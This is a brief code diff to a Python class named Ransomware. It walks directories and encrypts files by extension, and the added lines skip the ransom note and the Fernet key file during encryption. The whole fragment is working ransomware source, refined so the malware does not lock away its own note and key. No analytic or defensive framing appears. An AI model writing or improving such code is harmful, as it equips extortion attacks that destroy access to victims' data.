@@ -113,6 +113,8 @@ class Ransomware:
 				file_path=os.path.join(root, file)
 				if not file.split('.')[-1] in self.file_exts:
 					continue
+				if file == 'RANSOM_NOTE.txt' or file == "fernet_key.txt":
+					continue
 				if not encrypted:
 					self.crypt_file(file_path)
 				else :
